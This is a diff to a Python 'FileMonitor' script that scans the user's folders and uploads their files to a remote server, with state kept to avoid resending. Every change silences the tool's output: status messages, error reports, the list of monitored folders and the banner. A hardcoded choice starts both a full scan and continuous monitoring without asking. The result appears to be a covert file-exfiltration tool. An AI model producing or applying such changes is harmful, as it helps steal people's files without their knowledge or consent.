@@ -75,7 +75,7 @@ class FileMonitor:
                 with open(self.state_file, 'r') as f:
                     return json.load(f)
             except:
-                print("Error loading state file, starting fresh")
+                #print("Error loading state file, starting fresh")
                 return {}
         return {}
     
@@ -85,7 +85,7 @@ class FileMonitor:
             with open(self.state_file, 'w') as f:
                 json.dump(self.sent_files, f, indent=2)
         except Exception as e:
-            print(f"Error saving state: {e}")
+            pass
     
     def get_file_hash(self, file_path):
         """Generate a unique hash for a file based on path and modification time"""
@@ -112,7 +112,7 @@ class FileMonitor:
         try:
             size = os.path.getsize(file_path)
             if size > self.max_file_size:
-                print(f"File too large: {file_path} ({size} bytes)")
+                #print(f"File too large: {file_path} ({size} bytes)")
                 return False
             if size == 0:
                 return False  # Skip empty files
@@ -130,7 +130,7 @@ class FileMonitor:
             
             # Check if already sent
             if file_hash in self.sent_files:
-                print(f"Already sent: {file_path}")
+                #print(f"Already sent: {file_path}")
                 return False
             
             filename = os.path.basename(file_path)
@@ -173,14 +173,14 @@ class FileMonitor:
                         'sent_time': timestamp
                     }
                     self.save_state()
-                    print(f"Sent: {filename}")
+                    #print(f"Sent: {filename}")
                     return True
                 else:
-                    print(f"Failed to send {filename}: {response.status_code}")
+                    #print(f"Failed to send {filename}: {response.status_code}")
                     return False
                     
         except Exception as e:
-            print(f"Error sending {file_path}: {e}")
+            #print(f"Error sending {file_path}: {e}")
             return False
     
     def get_mime_type(self, file_path):
@@ -216,12 +216,12 @@ class FileMonitor:
     
     def scan_existing_files(self):
         """Scan all monitored folders for existing files"""
-        print("Scanning for existing files...")
+        #print("Scanning for existing files...")
         total_found = 0
         total_sent = 0
         
         for folder in self.monitored_folders:
-            print(f"Scanning: {folder}")
+            #print(f"Scanning: {folder}")
             for root, dirs, files in os.walk(folder):
                 for file in files:
                     file_path = Path(root) / file
@@ -234,7 +234,7 @@ class FileMonitor:
                         # Small delay to avoid rate limiting
                         time.sleep(0.25)
         
-        print(f"Scan complete. Found: {total_found}, Sent: {total_sent}")
+        #print(f"Scan complete. Found: {total_found}, Sent: {total_sent}")
     
     class NewFileHandler(FileSystemEventHandler):
         """Handler for new file events"""
@@ -265,9 +265,9 @@ class FileMonitor:
                 observer.schedule(event_handler, str(folder), recursive=True)
                 observer.start()
                 observers.append(observer)
-                print(f"Monitoring: {folder}")
+                #print(f"Monitoring: {folder}")
         
-        print(f"Monitoring {len(observers)} folders for new files...")
+        #print(f"Monitoring {len(observers)} folders for new files...")
         
         try:
             while self.running:
@@ -284,20 +284,20 @@ class FileMonitor:
     
     def start(self):
         """Start the file monitor"""
-        print("="*50)
-        print("FILE MONITOR - English/Dutch Support")
-        print("="*50)
+        #print("="*50)
+        #print("FILE MONITOR - English/Dutch Support")
+        #print("="*50)
         
         # Get folders to monitor
         self.monitored_folders = self.get_user_folders()
         
         if not self.monitored_folders:
-            print("No monitored folders found!")
+            #print("No monitored folders found!")
             return
         
-        print("\nMonitoring these folders:")
+        #print("\nMonitoring these folders:")
         for folder in self.monitored_folders:
-            print(f"  📁 {folder}")
+            pass
         
         
         
@@ -306,12 +306,12 @@ class FileMonitor:
         choice = '3'
         
         if choice in ['1', '3']:
-            print("\nScanning existing files...")
+            #print("\nScanning existing files...")
             self.scan_existing_files()
         
         if choice in ['2', '3']:
-            print("\nStarting file monitor...")
-            print("Press Ctrl+C to stop")
+            #print("\nStarting file monitor...")
+            #print("Press Ctrl+C to stop")
             self.start_monitoring()
 
 def main():
@@ -327,13 +327,10 @@ def main():
         try:
             monitor.start()
         except KeyboardInterrupt:
-            print("\nStopping...")
-        except Exception as e:
-            print(f"Error: {e}")
-        finally:
-            print("File monitor stopped")
+            #print("\nStopping...")
+            pass
     else:
-        print("You must have permission to run this tool.")
+        #print("You must have permission to run this tool.")
         sys.exit(1)
 
 if __name__ == "__main__":
@@ -343,8 +340,8 @@ if __name__ == "__main__":
         from watchdog.observers import Observer
         from watchdog.events import FileSystemEventHandler
     except ImportError as e:
-        print(f"Missing required module: {e}")
-        print("Install with: pip install requests watchdog")
+        #print(f"Missing required module: {e}")
+        #print("Install with: pip install requests watchdog")
         sys.exit(1)
     
     main()
